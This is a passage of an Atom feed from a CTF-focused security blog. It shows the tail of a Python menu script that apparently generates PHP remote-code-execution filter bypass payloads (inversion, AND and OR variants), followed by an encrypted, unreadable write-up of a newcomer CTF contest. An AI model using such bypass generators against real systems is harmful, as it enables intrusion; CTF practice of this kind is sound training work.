elif(operation==&quot;2&quot;):            result=quFan(target)            pass        elif(operation==&#39;3&#39;):            result=rce_and(target)            pass        elif(operation==&#39;4&#39;):            result=rce_or(target)            pass        elif(operation==&quot;0&quot;):            break        else:            print(&quot;é€‰æ‹©çš„æ“ä½œæ— æ•ˆ&quot;)            continue        if result!=&#39;&#39;:            print(result)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¾ˆå¥½ç”¨ï¼Œå„ç§ç»•è¿‡å§¿åŠ¿&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;from typing import final
import string

def realHex(num):
    if num &amp;lt;16:
        return &amp;quo</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="è„šæœ¬" scheme="https://sakurahack-y.github.io/categories/CTF/%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>timeline secæ–°äººèµ›</title>
    <link href="https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/"/>
    <id>https://sakurahack-y.github.io/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/</id>
    <published>2022-04-11T13:46:45.000Z</published>
    <updated>2022-04-12T08:49:28.328Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="428e54a308c76cc06c7c2d72cf4499a827fc0118fcc10fae0cb9da6413e54d4d">329582d599d3308dd96c6b56d6bc1f822d06e9b899f44b25299bc2af72884e3d1abc9a4cd96e9c064d8877009252c5c8bcd41a7c27c6f8cf9a1e6130ca81228bdd9144fcf6846357a0c9d8613dcc392ecd3e717b8255092600bbf3f8d419080ed19a0846c44b23d901695644a103dccbc7497f4e6c767353ae14186ad319c9b10e346c6cb43e9b166bbc9460c4e81469b3eb647c6f7c9d73d32bfa139c259acfa805a31f9d5b268e0fc2d9dfecaca20e3159320fa37c99e5fe4ae174f454076e37b7e8060543ed6230a0cba0ee606e767a8a2dd902b2002b8a5be1729059d7a60bc517f8b4b6872eedb845107d7d09225ee136f571fe30e8a7544f4ab403b709e817759b736d015bbe2cc3e05bf0d89c627a8d00c3bb26f0fcc5386e6b7d7b5a236521d2b573c195e794a16974c995ccd1c511a60c0c919f8441e72ab4f5b9bd0a3d7f61076519ced1f9d9b2f521c925d5ef0080d88a41a212b5845108f2f88e01a03801c34b02a248e4daaf3e66df8ec5d93408136c89108c28ea5197198e8559b00cb948609a6cf418b1f4d7e8f9351ddf07d42df8382012f70f0877f112b2dd6a3b19fa80f104594b666a0e8cd541fad67df3828af720d60ab4e349b4b50c787a00d72d0008bf427ce2cc8e7f9c93fa28e309fca535d81ce5c9128d04e820c25c26d47ff59a726a6ec4dfb77e600a6ea1aae2155b1a881d64ef30d6868f28d2a516fb6a18a9013c012da9237487789d3e53731102f7a597070ef37ac49509ccf338144026af8e4f5943f708f7506145e46cab8f0947a199b1a1ba2210c8d7f468a0a62780cdbc1ca48ff4bce9dd2578d824dddc8c76ebce493d105b12bea66025995b2138e7357cfd97a8fa2016e25eb95230de7e3f9af4cf664f1b7579a26600a6c11560343b9619a1488af1daa6dd17098ccaf0a595e53e519f4820c7419b75ebdc7be32f0c5deb67b219f760de5e31fe60b66771c96d0036453a20c467b1d29194acc4ef5a39f751591ef328a4bdde6484ae80f925c6892ff2d0ff58edf291bc5830868791762749d43c114ac5f125b95eccca40b872cd517651dc52a9cefccf31398447e2788705bb9799750ac2aa4fa6b715435bb8efcb59bae5d787156d7dcc8340fff81bef5a80e6ce42d1fbfddfc8776b8243e4da8c8af7a86f08f97334513a311a27e803e0b9b8472c92603595a726c9f058fff54d544ff8d10e7618616eefe8239f0df69fd773c2148a9ec6f4d8e2f4d26fea86a116e329a40af27786cea6f5c878078476f1dc4b58ccd22b42eaa582362f7853a41a00cbb3c57863b808e393e3af80139d21109706c7f5ab07f33619d6493ef47cc96bb7a4f6b7c7782003d96ac9191f55dc7983d36e53a2aaaaccc48cd18394a46999f9f97d12500b16227fd2d43242319a8cd83a8d05ffba1517144f3e8877b1090ff0e94fcd615f26355f7b9dc11c8aff59a886abe67aa90e2dd2b10d9cc28a2ed8609f8ee8f1c592a518c515e167ade2509194c77b4efaa3c13918404a65b97e929a272e733808bd07647d8acc02efc40c8ae8dd6310f778391373e7004b00cbd0fc39601b60c4059c1bdfbf475b2ca5354a11740d482ad51d7a07a1e8677c8cb54dfa39069a9425f3e4d61df8786e6f06d04311c5b9a56e658f2b187ce5b0ade9439e9134000c8265f5e7b99e3953c6061c10c48fc8e1e515886edbcbf2e3dde8d66dcaab6fa9386c23326c78ff0fff8546e768ceba3a19df40338eae6a57e79a09ee1d83b74dcf7e0e77a47cb38f279ad4262fe20045fdb62f37d6005bb1a34f7fab0e339f3952b747926c8019c9f53926a96b4adddd1699920fbb29a5acfeddb676dc0d946bf12ad2eaf7eb86284cb3e477648eebedb8f05b35e58aa0343be98ac87f485d5279b0c592ffae6545d7a3676f4da3fea3e3d4c7b0f8f4b44971702a9ab6ba91153879349f7d66f161345f082bc20be3ba21255d1c70df472f6990fbdc8dc273a950d14db7553d3d0125710d06ef35ef9dbf785466cb33e31fa0d94e361f106586bcbd56ac948fd7fdadecf8a586312212d01c5080791c9ef7c800cd781a41936231108f915a971112c3ca18343f237fba3a45830252d9d6d1fa4cf7a29851f24e605526ac900eaf68ca1d5209064982bd11f31255e42699be684e241a7c0648624ece30150ba54b91af2e5d052ddf157a3ab9ecfd3ffaebf5c6e99179efaae43d10746ab697e6cc3a04927ecd1068718e02cde5229d9684d39fca866c9fcfb568a8c5270573762b8e9b2925d235d2aa0a7208f2a4d90788585914bce49be77447a6d3a2efd5a285316a0002c9d55f65e4a3d3a96c4439ccd7202fac0f0cd3a46bfd4bb70f07722b83c8b7a112db0d10e5c9d0aa8a5f8578bd224197f3ac0e9a49cbee7c239901bd49c938ea16a4da2f76972cde91e5cab429c3ed5b0897a8e889cc3968e22c4b656a90eaee5d2a7836d42b55eaedc8c6f72880816f09acb582b5352a0171f90513913ba94534d144f597a1b91ef248c625f526fbcc8f7f7cbc136dba515cdcc4970761fb39129a1713b32c76a4677af646c2aa13d2a87469f387e080bc9b0f83454c165e9b043b26fa8ead3b4070303aea73737084d07146e8e66cb18efd71dd1cd3043638b0317a941cc44f409acb7bf8a3213d8ce2b6290b73058394862242583fb2a56571a0f0b7a0241cbd547f5527476cf3b0c92bd04fb4967259a40f5773550a7c80047be30e4bd61eed384d21db5e1ea0eda8eb572dfc8c5ad75eb52330e320e087478cf2cee5de6afd0cd1c481073df5592651d3d441c455d57adfa2cc63b508f1dd26d08fb5e73ece1fd881907886a83d9b4b924a0ba8499a743f38e9a72aa2c3086a4376fc7348c395c489ca1b7792d10ecf2069ca1c404fe5cd3e9ee094927bbb8a9f02b4213f387e02b0891734ca4228a0369ecd9bfa70367b5103651aaa76e5da29297e661b7b0d9ec90b4bc6512c49107a07f07590c8d68a4f0af61333b6406fa03dc9ebb3ab6843ac965f90441113a54c6c13793d218774e3f09099cef9e33a9fc20220cd663343f8f1105e6cdca8ab479e9c511a4e56499026ce27c1b747001e42fff9430d6ee857de9d427f476d022fe462f9dddfa652586b5995cd6a111557eed0f770b743aee17d7f3f50196d803f6ff4daae6ce3d0f9ac0e50e5284993c5556b971c1f2b17d0303453f93f1fddb5cd541d374a045748d7b8776dc9f606ae358887b6d6b90f23348b0d57458364d2ecd76474364278a2b1fce7fb7ffff10800082d0b9fedbab82039f3ba1ba680958813407ed288f07b04be926f653f3303947de3b7eca127668a8f267e14bed5c6272d45cf50c76e70de24e24aee576c5c5401c89f5ebe9cff81125cad6599da3624b046e2acde0a0b7f615449905d17dff132c6b1b2583b1a56f9350a0cb995f7b32ed68367a489baabf213f21d058550725d83ab3f909ef3187b6f89ef0b9d2852cef01ce66f95f66ea5e67eecf854f1f45f841891242dddf616dc03b1946df3913b393ee44c8c18d982dcb1308af2e10786198f7969aaa76d91f34b43eb964a74513294c3e3f80ba31686fa4c2f03b5b30ea63b6b6ed50c4785d398f4c81da113b532de964ce0bf306ee7a3f6455091b5c8ff27e6b4128fbb83c5383d2401ce14a7146f63e268b179ac196bee7b3ae3b047a940ac5d3343dd375aa4ac98945d7efd83203348d6d2f3992674334196892c32ff83396d52a91adc74fd94cea277b95916f68663865cdd3bee1d7641e5531ab4a5c5d386d1ade07514eba377bddfd5403e9cc6091ed9e47428aa0d52d04b0857ae6d70477f407c96f673412d99d03d98417dc42d593d644e96dc293161f94a4dbce11db5098fab92e688cfd41e9667085841c535e2a48e9eff907bf3e0cac0d02c363d4611b37c073aaf6d50dc09eeaa3f92cde008c21e2068aafb836e0d07ad37cbd347207045eb0932decb06f5942eb0436ac38590be747853f8093240c3df86770c212bb59f91fddde1fe1538dd5f07542b5c62ae124a95604eb630068809c472c6ce8260c4ef28d01f8bb45cf7bee33e94d69a10f5f1d3c1104f6e74a1703ac851e2c4e327c5b6a7c6ec7f18a09359efcc50342147b4527324672921c0847224c04c64f04e5f3370346cbf258eb07a12b3248fad6781c927fb04e66ace5f6ec20bc111cf276dbaac52be64ec3ffac93fff6adadf21fafaad872a55f24cb3325438002287b53a5417563fb41b002f5ed7ad9226f637d148b6c49beda61608c954d86d5fd41550b63510ce0f6f947e22d6d9d839c13d01b02ab56899ac1c66763d9e3de0702823e9c4764941cec2e8408145eca635651cbe086532220eb0f3586b4877dd35c2020e9aa5e6369172c0dd7a0a28081973f85505128c80be4b8576987e1cbe55d9ddbb24b4efeaa1902c49a2f785fa6f68bc999c1b0f230d05e6d7feb4ae82d8580220e618c92e63b98ae7318ca013f518bdb6e140c3c3585c91129c1685f6bc3d572c87ebe71c3b78b8747a4979a23d4ae783f1648cbd3acc34434b6518e47a06ccc76c4f07d23520287659321beb01691f278b2bca5a7a292b86ffdd26a9cb57a3b93142321c584eb18dbb56af58f6077a2c3365e35aa34a87f79fc272b28fc68604e656b2e165a79a2576ba6e6116dcb68600bbe0b595ac94d209ee874b9ef1c165dd3fabfa2edd84c429f51f6ee3718c61de7922b47580a95a072451bb4c1bcc28b86f54b392be9f442ef626a0b21bdb3b62c82f1d8c9ddbe071358830d2a03191c641eab05a96db551648a9531a107314da0f48511916bd38f1a6bd43dca9e180c1def08688efed8d1a4f711c76b0d397ab70b65660f1028646b35a3341afed86ea46ff6878d24f0fbad297787b952d13e9cc819967e326c3c4ad3ead8f65f2477cb071c449b5f074ddef3946b64a117a67cfe2c7d6f1950fac703ff0a8d4cb85190f9ca46b1d7327d35b2481aa15e79ffac4ccc3620e9fd279af89ccc0daa592b9024ac6246a74196126594761b9fae601068da60d44e2b39b24b5219d343db1f3a201c8e25ef03d14bba3714b31e944bd7209429a29588e558ad031dd2aec5b1d0c23244f88816631ad041a15efc233da60a3600bc88d183bddbefde26cb87500c4614f1546921f637b4735968b93f04974627d3f47eb92e72742f239827eeacda1f0cf256557fcfec1e350df216ad75a1e3c7e6909052dc3c48b3ac7b580b94d8ebafbdccd2a7ba1fb11403826ee8c8eef00e3543cc959ffd28e49d3c7a95169d45d7944f59e3a752c6c91b833e8ba82d0a5f1bda11116e3be101bd752656de5583a9ca64b3beef10a442109054ac5e223750a61a42e0976d53b3e5583c58a0e55fb521f2a435bcfa21d759d436dfbd7343fafe387ba8cf81ba5bc0fd9126532360e034b87e1b78c1a6e4653a39957ca31915f4b21292bf20866df8ae5a5c08934dd5d87e5ec7cb9fe014bdb6a3d018a45ec4de254c7e9bb998a15e12239d40a8c78bad0985074075e044a8a2d23088ed44db6298307a9f976814a360f40b9070df959c17402cdcdbfd9eaf961425bb049ce0cee67d9909d4208b16d7cd5077b1eb41b91b1b2d15c561665a6f17dc12a84c0a46523b8dfad7041c40328b661fc87a8385295387ff0068c57f67edfd3fee6dee8b9cda4e4ed984f95090e69edf71ca6ffed1fda8a0b53bb600c32726d010a9469a0a80934a5a386795872dba909bc4f76921885aac9ea5b823f083ec8cadfbd5aef455ecefa46a1e14e25134aecd6256bf9dd8b5affa20ff07b1300e5fb7f815e34e0a5a6a1e9106624be5844f2e77d8abf4caa24ac68a7d304973cd780a0c851af70553af49edb65a2c4600391f80868be780d116b003ebc057fe96962bdcbed7caed4938d02dddf913b5f7a119c691460dabdc0261a454aba93e5c85e29bb0ed26cad281308cb7ed4c97b9fa40ff33925b20adfe49b79b8632ae67796d42d68384b762ca9c21d7377f44de4ab3f73bf4d03cce6c8d8d679438ff909bf412cf7e62ff6e6976b71bc24fb48c4bda5a814ecbf721848f557e28695e9df7aeae60d328878b48cabb1bd7586fd5c842420a1d68d7cbe59d008b21406aa1cd4b2c8e410b5b2365472be8767310a54fa25dde8985b1379c21c14c4bfbd92ce39a65c556c20a73505db4c8c55ee4a084e3ad5687d127161e750e45b77f0162be51ccb61ea2d57c29a2097602ed58ec187d5915dd1ec63ed3f0cc642d69a68bfd5cf128a9d543cbf8e83acf7b9a8a42ff5521a0f1de44d4a13200f450aefb141519342d08b9fbedecfabeb1980f8934d7f2b112c7d399c35d8ce14d0982bfe227a1f9be6561e8a3052dcf21f045ee976e8ef9eb1b5d597e40e9ef48a96e911a8be50dbc8060d2d96b103e7d077860f224e60613e14ed5cdbbd722394e26cc571b767124e7eb4535abbdb5a5ce1746bc4712789da622892f01fbc3a53c74e11ac624ecac78f6bf9cff68229b04d58dd0210a4d09522d59525ba5085c18b1bb730a30930fef024b4a61a331f4c90ab35d0b572f183ee3a6d965ef037d3aca3ac16c824140d3cf6ab8bb572336e7d664af4784837b1934550fd8f92c95c46959114e381f58e432ce9adb74ce8cf9fe8775432c4443da719cc98075f3265ee1e044e96d9644a445591762d18c78152bafbb7ef9289fc16b434cff0136822ce512d7720a12bdf35fe7748e7132d13b8c40d8c3dc92f026a149276cfd46ee1d237c58656fbc054fc170f9ff8bd665289681bcbd2cce8e0de9e4d4764191f6328e501e3f856066284d65b037a5c92cd756837b2e925cbe481b95c71899c426cc51efbf2a1fb5ed22ba8db30fd756d8809c566188da8558265f17de4f50c3cb1870aab3e4a2066aff25fe58d9270094b3b72477931ff25b720ac9b41f6f58ab97e9890df5713f6af1dc6212414339f5ecc59041ab5fbe7b28891a617cf47780bbfdf0d93fcd8a60934ba2be13185e6620efb3c2fe951b8dfd0321cd62d8b676afe9b6422d19678b3b290d3302599088acad9edf02e0a2ee48b857beecb7026661459ef54a26dbea89e89643e74f18c9df59dddec5e1a213724ab623cfe2796e372493b76e92c8d123dae53a6a6af05393b959eda139d5313d45abc5b6da4d1a1a74d02b2cd24af950506306164cd0f1a41b94d40f1114cd7584af30d50dd60d3a482ff5a0f5c605dbf5a2ae620ec04990473b4c903fe8669bc44e08038e47a478cf8ff18898d5e92fe714ddd9b7de946147c8c8b7b2bfbb5bc35310f0489aa658160107f740047932704007ab9f3ff05eae5df19c8cd1c665d962775dc912d3f636d9e2e72904a7dc6f7e2b448dcd7b4366147168f4ecb726749cd314f82de33814bdad6d4d6597fcaabdca79401b5ee5381ed64a69e0dd3851460f8b5d69147de84228481303bf3023df004d3ad11ae799cd8b6cd669315b2dc8679c4ec250c73e392e31c65e6cbe7f4024b0fc5040e06805807f512da9e003e707a6b9cd7188edf1e0a3689984509f991f3133aed4e6fc9e54ecdce2ae41f12628ba3c846d11b4b3329af18b761c9073940007eb87b2a1d8489fe2885b2b1d679f729d0720c9715f5c79c2b1c4482d2cca0e98be1bce6aa106dd532cdbaf7a9523dc9a9b3d4b996a7c6d9df3fe73594a34215406c222dbef81bcc565aff128168396c5c784d3312cfec5bc2a636261fd5f47712410e8c675a2c74772e2652dec7d40ec64324eefe73ae9ad308fe5bd65c82ea467c545968fd5914ccf1c0d85d0f7af440fda3a206267c51246b93078661a611b2007c5a394202980e77ef5c8b8b237f0e666febc8d25eaa2847b402a9b3dec98b3d3e2444964598bea029e36697215bfc1bf28d0124d8b5aa705151a595924065b0a4dac9600d0564af0bbce0dfd9c49c2db546e4a3aa3d5b45d936892929b672d0dee1aac8f67b0a442dde094af9b16918e11933f44e1230d16af42039ccc7f8c9cb5b1e242ce8338cd66f0249b1ed09329414a50477d4dd2d5940e7d192d913d607ce0aadb9af00746c03f41ba6f331d9048b1c366175cb63d7ab8fad9cd9517d426c87a66660b0db63a2570fe4f62d7759ad21c5230601b62a016776ebe99a7424e4e27be00615d1ca9be38405f1cdc9827831dea3a8fd98d0b441b57e607051ef893ae37a870ca4364847225689f925c66dfa80fafcf8b7ae4932dfa2eefae801feb0a995fd3a033c68c0c07cb4923a9a39359900c6630a6d13c66711b185a78dcf545b4da8f3531d112c9de5cdc12627c8b044b075db10a77dde42394631d9f8336b5f24947d8a665b41757b1b0e0e5e4c3ff43b1c140741d7891b819d6f9911f7f10a4b130413734f6201c78ec53940a4a29cab7d256ff1134f594b533747463a5eaf562cbb3d366067ee69c3c997e94bfef9cab8332cfae1f0209f5f0648e651bf5aa97c3f57d32f7a62008df48a379768949fa9e29f32d434a9dd2d34b84013860255bc20b6d3273aaefd3c6bfa326f34a4b790294dd7d650a95476d1a3dfdb844751950e68d746e359811ec57fd15f6d7ffac3442461ace7a860d35e9755a1190f94cf1102cf5456cd5fd7a40f1cf0fccee8b05a4b95384af35beab6ee2e640ec87b59df7f80014d9dd7a5d88273ff27022ac88187e40969d37cf76399f586fccbf0348327438445b05e529997e06cd08c4b1ef174a6518d2ed2acdc615b0a4395f0749f1ee3ac6775d10e91e1a57a628ea8e3705fb1fb0996c1d240a26ccb62f3f433ef9450aa979509be5532e984bea6becab2995c52789d6bd4760c6a84a3959154102450adcf1eadaa0648045e4fede795c6dc8ca9a471385986977b86122ba03a85686fcf1647a9826a1f843d572d72901cb27149d04135f453d12db0d3a9ca4b66d29e1f699e3437581c3296a816ab81e7bbbe2eb528b0f6ba63a1e8c781edc200dcf4a358bf906d90d7547d71780fba55b49c73753902c42a2a87ad98ccf50002f1fcecce2b6a1f2532de4a9b6f85f21b3d39370f913cb3e738d38746d255f72430196792093f536ba2529916b86bf66c7e28296a320ac924fee4c26c9945b96110d3c798585025d7779c175265e56ffce66ad408035193a3096b3e5ab7895077f74857c033344b2d7c7c2e5f164e9e42ae1be95dcaa0f5fa186bbb840e099250fbb1231f4f4af00b58fc661f5d639cdbbdbceda7988fcace599ba55b495f9cbd19c5c25fcc5c67551670ce6cc160c16150088ac78793a03c6d9cd10fa095ddc686115d65ac7ee29e23f1ed2931b428f24bdf0357ea48e9f264a1a7fe9ae0d008cff2cb24da3ed3742368d555be55967963caad3278f80fb1fe82b6c29b4c1d397e22e76e69c977eab0d57da0c063e917108519f6818cb1778f7a033d5d84bbcf02374a5edf61205ef90dd1ace9227605bc781d3946605b2e39c29983becf0a5bfd0d17a345b23eacd8b7a31a5968256b7fcbe22d972c74eec722ddd9616f7d00fef5e1278059a925ee33649f12fa158321ac2def7f4eaa2e23f114090bbae50364d3bd160df139aa58f466e9eda549389b346ee25d4918565b9cc4b70665b26bbd228bbf64c94ac4b5e16bd12294a1ae634ba75308c58d241461243ba6f9cccb7d9c4f040552262ccb39c15b1b927e87fd3f13bcde43b4209a3093cc48094bde8c901b4b20580dfa6d6b9bfc1b9f70e5c7d6ca4141742b2c2cc23f7792426d5a6087056399f0264e7f936c3d3e2f6150bdae7a0cf9f5376a66209c6ca49e705588f2b3548a074e4d92195318df02ecf7dc0286997002a42b8be58be99400d0d9a504e972e803f467bb75be63fadd5135dacd1b4988a239f5da34589adc661b8b43ee550bd671d0dc699bb2162b1d3eec677e10dd64103db5c9afad77c17583043172da86b6b24025b3b5de296dbabc98e90417860205cd9900ad3bf75a64381fa3b0c1a37b50f3de716e948803f7fdf41bdf365d515deda340462f2edd1a91940353b46b1bf76f955824eeb8589222b1ede3bc8fa97b4b0aa6a3d431409cebac2efe331f2adf7f9bc77bc348969669f420b7d2237aa8f1e3fd57c0ec9e95512efdf42d0fc8bcd59c4eb41b8aa7241d9ffe87bd060004670fe4cdf58ea5c8807b44e1de94c91b72455e8240f989407a79b974b5acbddd8478c989a58a2fbe21a36fe06fb824afadf0c02339a0140c2a78cb492de0426e37a5aa63f3dd8e4b86cc2b9bef178ba4c2bd4817c278c5852dc1ac0064b9754a3a1a878c5e90d84e05d0d8aa853951a7fea68d5cb1e772bcec5c7977ff2d772e89480c92d7cb279b75e02a47c37dda7fb9b661ed66bb3f77d40d47632e1c414edfbfded44366fbe1353707dcc9afc468afb7e9bf27e98df8390424bd1dce22371ecc1c59631075223f0a904e8677da6001ef94dc3030e245158ec6bda7a18a25877bb8145f6f93f55828e418aa6b3e2a42838266d6453a9b4cf070244fb7135330c30de6b9a0014d0beb7030b058007d72d7502d1eb5233f52e5c340d6c54128d0472d81679b16350d23ca4df23763b465298f6b7e349f83280c9751084e434ad725d8720fc752f1c769d2dcad533a396c5b0d89a434349a2f5cb9c1a15ec87317ee48535ccee5e56983c47cf808e6588c7ba36761cf0a694edb7be11729a461a59905b8e87c310b6610b79551627d1d369fbd8ca4b1503639afcbd0e21766166f7896fe7b9c7ecea6f85e92df28779bc071da78d0baec4c5c84ac3445174147684cc7c831aac3c2b423cf920f4c6258651e3a9fcffb9ac5a859d3759130b7a8b291f5ca320de391e2c440d58e7d3307e6517ded8ac5ddd4e18cefbd13938caa25d754b03358b430e45899b60a648dc65329f9d198d912c9647b88b972523f6fd3053c880b621c0a2acc99800cc8199653af2e083e1098980661ea6ca73cd3b3061a617fdd4b95b3dab42d3a498ab1cf6e46e4fe351da9c33941b51a9589bdcb3e6947a8532236e02e46d6711747d3429e2012b155f28c591e5b33980e8e8e41134099a6ef9c3681b98e163fed74c5aa4d22f46c49ecf4d3b2e28302dfe448693bc135fc213e532f879755ab61180cb3cbbb0fe5e93d759ad58761d4346a2bb861520bbcbd41b10224a62d5eeea50c2384e93362b46fe865e5f4b3fd9eea6cc2b3210354727f0a8ce82f0d51ae07fcb9f32a4bf30f1b03b2be455e1333c000c739261455412a24716fa12764562a138c28b7a5713ec38c4e8152ec353f0ac58e89fae8e9cf75a9b1470fa78a4dfd4b589cf3d0def1222361a3101317bb375198684f54e3844523ce02f8baf6d58ee3de6955897fe1821afba70bf2fe2036ecde6fe45f8bb57bbe8fde5dc2709d6c75e8d5bf60cbc56e61dbf893556dbc829ab857481117dcdd8e3b160147da9c1d7920734c8c1a68e0444a809ed2b3a60122b0872b9fc64253cf294a06d3bc56e5dc9a0871c7a233b4d827550f3e4446ae11bd5c6f427ce8d7968827a8eff9845ab78ae3f94401b30f3a79f59144e029b282fb1ca8acfbb0447d1c683cb0f567a1eb4f69c7d6a9d22d849dec4ae74e76ae3dc72441474e3c20c963007f71eb404c87deceaf21f9498bed5181afc4110b6ddf77516695da935e0811fc1afac4d06d78dcff64c553dec9c9097763417d59e6651032ccecc0f7ee580d1f0019456c2a4157da7fd4c4b860b48ee50d885e18aa1877c8e6c4a28d4c1692b1d4a45a515f8ef14318337cd934e416ae5c633e67b4942c8e8873886b61cd26d900d43bfc93fa78698d0760dc38d8c84b503d890e351d719a59f1441fcaf217ee673a1a50830212939127f10cae76eec15cd757fb43b8ec784a15093d099b7fb322589ffed452b69209e66eb0ff003872cf628f5a3b1ba1a91ce9e3113c1cbd62939df75c7c8e98533147ac56c1da9a7e25344b19fe5f8db01065f918de6e0f2e981c8e67e17ec8cada379aa2ce9ff68086332c7bffbe9578cee4c9e82e53490719779653f440db07bd82a13a0e57974663fba17a97b56ed246ae795768d062da470aa034a59c758a47a4a3ed00d0e543a1bf23641c9bbe368aba5bb940e4cca4769d1905eb764e07f2ec72af705da8ed68a04437330198acdb39217614f08c4feacf958eb0fcc41e4b2cb1aec365bf546a435625f3dc6b118bfe0f5ed400f585383aced4010048e178c59f5bbe042244e4216ec7658b385f2addb8720f8ca1b607cf922d119e06e67f42e8084a5fc7a517dadabd350ba09efda7d67260295a39b295a32e4007ddaec9d270cb29d28afd4f76ee82fa93641c40365713c6d6f71059369660ec7c131060b75aca95ece71572bf84363504279d7ebfd11fea515721d7b28fd1b20899c0ad0c37f56ced47578be6c578058cd6d65cabeba103dc2d08674b9b129cceed2c126a0f76f6e46780dfadd5ee4731978ff336c0510a34dd3e071279e3f76fb2437f31a79240f0bfd1cc169bcdfb3ab0386e85557725021b38142a4be20ec6cedcb45008ad9d3bd645b275f1e5060dda0c9116930d3ec469e894210085199992afbc7120a669114d28212cc64469125c970587dcf398d74fcf59e8781b9c7b6413f21316433435691018a77845c37cb2bad1d4fce9408aee935ee2a93a492815b55ac85c2673b3fc5f4e951a3e5181017dbf2e629eae98204f2cc66fa3e4697557c08aa672ad13d10278c910849afc188588205d1a29df1d3180795c0d0e2e610be3fc961e04c5b723e411a3e2bc4225ce97cf96987e6986fc5d5d41a97558af5f9bed5be98e8631c07fb498fb20f4a72a826c83bef84464793075622d9d33acbac68a9be32a04314f555f407f140d791620a08f96012362a558bc7273b20d7637297c18d3edd3d6b393196ee208e524a9984588963bd44e79f5728e6100f9da895e8fde2bf50f50de636f9429be9ffbdf476200b7af38f822bf73bab77d200d21450f828f30967c7d59436158d35821b9803ec138be281c04bb203cd8a189a72bada01ff2d7401ac61f92372f08bea0061d2c7d127d8b81ae5e64ca20c0ab3a504ef09a3ed1e9d3ec9729383f655e233b3d4d94be2bbc004e7e14617f6aafc2f7870d57984c3524b050c8e83dac82b0d83b13a162d2669bd6c2efc3b79c5de83c509c1d0a2df40217a61ebf3b6dfcc5cff00d3fd26edf26099d7828ea755d295617ea9d5b85973cbb93cef90d665a27602f4471c16faf045e583fbb8c31afa3c81d6182b04957c1d0463cd9d91fc893c3f7730eccf73f3bfa341acd36edeecf46b6051d62c4067ab5b166bb510bc52a201a36a1b852a55024693528beb6dd3e40a624cc6ea6a1d3d0bd9a10866943959dee7b081e16d45ee7360cf6edd648da2d9d6605fdcfb08368404da17b2dcd5cfc5cf55ad8ea1b66198e1f257321e740a3287265f5feac675d9a03ac0e61f65536f172963d82f7279a9c7e9244fb7a39abdaa7fbfcda499dae37d2d732357d82694750be8c2e118145bffb6b48e1a73c1a2e34ab89ffc9fc5894dd571acfcc337ca5e2b5b323dcfc6c472323a9969d9e67f937728da7bef97be02fa068d5227172d6fc30a39342681bc7bfad80c6515166ac0d1fc48e1b40ed863624aa04b8a46a8d7cd0bca289c3be4773b87bf0780a6d849b5da842f3cc05cfdeaf379553eb28f8922cf6118b1a9406ac0cf0b5e8c7a82929b6d750a3670792b0a46c1fdfec7371dc39680940b33ce23b16a9760ba4569eb08739b9660e8db6653efb3a0c11be19f9b939b6b06dde91a2def18a6ee35f1734a179243135eb6f6bcbad843d4de927a1d98e710a1e0c9b36e13eb3d4bc08d7d986d7232f8a2f6608b933963c283b472aa2b2955046228455bab4be9c6312bcdf73c32212488d7fddf75876e6b6ef1c19997014eb9a262e8ae2a579833c8a2d65617106769790a50dfea66487745fcb23f029c9e1d2ec31a8dd1d7834077bb757e3f07a6119c4c7bc062622d1c7054f0dca5d82ad4b543de73521276f6c927fb5bf30bed983ff1da1cde56cf95a4f2ac5bc6619badb02de017526ac66060a6c8a820b22e04cdd4e23f44d942461c2230edd5d51c6cdc80288fe0f4eddc2c85a34a3c32c896c7ae51b865704e36b1b42263072209fbf8db80ad48dc983949a16f09ffdeb2eb5d95e51540ae636810c35225971a5959a992a8a4312a76b7e93f63a868bedfbb605b840edbab3bda1417fbfba242ef311182e5bfb0c035198a4bd0091e0d984f6752da34e9e9cc78fb94cc8d3eac01cc1e10bcfcbe3ec6fb967ed534cac5a2cda4b48f64fe1aeb78ba1f99cd2a950b2a9dd8300f668b424d14167cc1a643601acfc13d57fb540ab095ab91d8feeb0779292c22670c176f41206370d7a12e0fcb0c286140f89484f53e35b8901c996e4bd142aff48c1c57d2f42df64144b399a21e8f7d7e420f27a144adaccefaacc68b6cd0c7f9b0bea64e8d5babe2e0be71941dad88f61b65efcd154bd7e0ed1ebfc3e16b001e2e7f58f38cb211b71ad3d9a43d1adb6254399bab4163a057d2ba73e80ae48495d0d6489484a56e876665b6f9b4017006f6e40bb3b417c7be28ebc4ac61099aac856783a20d06baa3b3045673afb458e3cb91d4c1bda19cdee8a0e16269e4206759a212fdb1947f707a27601ad48b33d211e26df7908a2d90b5a36f09634bb7dd0098ea756fe4e302c29844fa74f3d36e9635f31f4fd0771ce86d762f8bb56da67cb0e7ae37420a5e654dd07588cb2bba9cc3d8511ff827769ceea575cc7ab1d59d70f670849d93557f1dd4747b312a60b7f5e16b02fbe4a22cfecfbee2b4278b41a9086bc6fde67f2ed4f33caf04f56a1f3af49754e177033ab62ac4f7a810f954196448d4eaff740da64de5303965bf65f42ac1c43e805b2c01228025a944dac58c8bca289766a268221526a83963bc3244ae83776869260e61a11c638677b9e6f6890dfca91f24cd087d2aa751b175299c30fd0eb9114b82584ce0163ce99753f5ae1a7375259ca8a163570f93cc49f1041e0f480222b450ee9bfe8f73115b8a702ba5638f411c7b8b32d30784ed702a876ea6b06f5434a432df50d1686485d75d1880588ab52a0ef673baa5be96100009b5bae75140f96145861a58b55dba6eada52c201395bc7de3b77f641697ac8376f378592c653d1ec0ed85a85a3dcc3489931c73978180b857fd9838c0bdc1fcac6b28b2533fc86d2176645296057d1e6a2c2bbc5d3a0226a438d62750ac9db7f9609dd74b986daef44cb77683f63cdd9935abeee744d7839123a7fc321e332525b33cd8a47a436c0e30ef5d625af3b01e38d1a0eaea29bdac02155f005ff22e47f2e18efcdfd77f672cacbd8b97eac83cd7267deda09c1df7065c232fb1e228c030469effe414df209965b7864b416aa077474ba6ff1a4ff5206d884ce32011a06cfc85e66223ba0dc4aa8c39b6e5f6adf875aef77beb240ecf509f35b851bb7d3d6f